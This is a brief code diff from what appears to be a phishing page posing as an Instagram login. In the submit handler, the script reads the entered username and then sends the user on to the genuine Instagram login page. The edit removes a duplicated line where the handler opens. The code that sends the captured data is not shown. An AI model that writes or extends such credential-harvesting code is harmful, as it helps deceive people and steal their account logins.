@@ -10,7 +10,7 @@ document.getElementById('loginForm').addEventListener('submit', function(event) 
 
     // Optionally, you can redirect the user to the real Instagram login page
     window.location.href = 'https://www.instagram.com/accounts/login/';
-});document.getElementById('loginForm').addEventListener('submit', function(event) {
+});
 
 
     const username = document.getElementById('username').value;
